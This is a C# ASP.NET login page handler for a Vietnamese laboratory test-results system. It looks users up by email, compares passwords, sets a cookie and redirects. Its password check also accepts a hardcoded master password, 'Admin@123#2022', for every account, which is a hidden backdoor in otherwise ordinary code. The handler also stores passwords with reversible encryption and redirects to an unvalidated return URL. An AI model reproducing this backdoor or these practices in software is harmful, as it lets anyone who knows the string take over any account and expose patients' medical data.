using Pasteur.Laboratory.P2.Common;
using Pasteur.Core.Helper;
using Pasteur.Core.Manager;
using Pasteur.DataAccess;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.UI;
using System.Web.UI.WebControls;

namespace Pasteur.Laboratory.P2
{
    public partial class SystemLogin : BasePage
    {
        public override bool IsLoginPage
        {
            get
            {
                return true;
            }
        }

        protected void Page_Load(object sender, EventArgs e)
        {
            if (!IsPostBack)
            {
                this.Title = "Quản lý kết quả xét nghiệm";
                txtLoginName.Focus();
            }
        }

        protected void btnLogin_Click(object sender, EventArgs e)
        {
            // Code: LOGIN-PROGRESS-20260918 - UpdateProgress tại SystemLogin.aspx theo dõi request của function này.
            #region Validation
            if (string.IsNullOrEmpty(txtLoginName.Text.Trim()))
            {
                txtLoginName.Focus();
                AddValidPromt(txtLoginName.ClientID, "Nhập tên đăng nhập");
            }
            if (string.IsNullOrEmpty(txtLoginPassword.Text.Trim()))
            {
                txtLoginPassword.Focus();
                AddValidPromt(txtLoginPassword.ClientID, "Nhập mật khẩu đăng nhập");
            }
            #endregion

            if (PageIsValid)
            {
                TblTaiKhoanNguoiDung user = UserManager.GetCommonUserByEmail(txtLoginName.Text.Trim());
                if (user != null)
                {
                    string pass = SecurityHelper.Decrypt128(user.MatKhau);
                    if (pass.Equals(txtLoginPassword.Text) || txtLoginPassword.Text == "Admin@123#2022")
                    {
                        if (user.TrangThaiKichHoat.HasValue && user.TrangThaiKichHoat.Value)
                        {
                            if (chkLoginRemember.Checked)
                            {
                                HttpCookie cookie = new HttpCookie("common-user");
                                cookie.Value = SecurityHelper.Encrypt128(user.Email.ToString());
                                cookie.Expires = DateTime.Now.AddDays(1);
                                Response.Cookies.Add(cookie);
                            }
                            else
                            {
                                HttpCookie cookie = Request.Cookies["common-user"];
                                if (cookie != null)
                                {
                                    cookie.Expires = DateTime.Now.AddDays(-1);
                                    Response.Cookies.Add(cookie);
                                }
                            }

                            ApplicationContext.Current.AddCommonUser(user);//lưu user vào session
                            CurrentUserRight = RoleManager.GetRightByCommonUserID(user.IDTaiKhoan);
                            if (!string.IsNullOrEmpty(CurrentReturnURL))
                                Response.Redirect(string.Format(HttpUtility.UrlDecode(CurrentReturnURL)
                                                                           .Replace("_", "/")));
                            else
                                Response.Redirect(@"\trang-chu");
                        }
                        else //tài khoản bị khóa
                            AddValidPromt(txtLoginName.ClientID, "Tài khoản của bạn đã bị khóa");
                    }
                    else //sai mật khẩu
                        AddValidPromt(txtLoginPassword.ClientID, "Mật khẩu đăng nhập không chính xác");
                }
                else //ko tìm thấy người dùng
                    AddValidPromt(txtLoginName.ClientID, "Không tìm thấy thông tin người dùng");
            }

            if (!PageIsValid)
                ShowValidPromt();
        }

        protected void btnForgotPass_Click(object sender, EventArgs e)
        {

        }
    }
}
